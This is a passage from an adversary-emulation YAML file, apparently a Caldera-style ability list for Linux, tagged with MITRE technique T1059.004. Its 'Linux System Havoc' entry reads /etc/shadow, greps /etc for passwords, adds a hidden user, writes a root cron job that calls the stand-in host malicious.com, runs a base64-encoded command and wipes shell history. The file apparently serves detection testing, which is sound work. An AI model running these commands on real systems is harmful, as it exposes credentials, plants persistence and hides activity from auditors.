  executors: 
   - sh:
     platform: linux
     command: |
       
                 whoami;
                 id;
                 uname -a;
                 cat /etc/os-release;
 8528dceb-4a25-42ee-a5e8-50530d240aa4:
  name:  "[001] Linux System Havoc"
  tactic:  execution
  technique_name:  "Command and Scripting Interpreter: Unix Shell"
  technique_id:  T1059.004
  executors: 
   - sh:
     platform: linux
     command: |
       echo "========== [BẮT ĐẦU] KÍCH HOẠT CHIẾN DỊCH NHIỄU LOẠN ==========";
                 cat /etc/shadow | head -n 5 2>/dev/null || echo "Log auditd da ghi nhan";
                 grep -rnw '/etc/' -e 'password' 2>/dev/null | head -n 15;
                 useradd -M -s /bin/false sys_update_agent 2>/dev/null || true;
                 echo "* * * * * root curl -s http://malicious.com" > /etc/cron.d/fake_c2 2>/dev/null;
                 echo "aWQgJiYgdW5hbWUgLWE=" | base64 -d | sh;
                 history -c && rm -f ~/.bash_history;
                 echo "========== [KẾT THÚC] ==========";
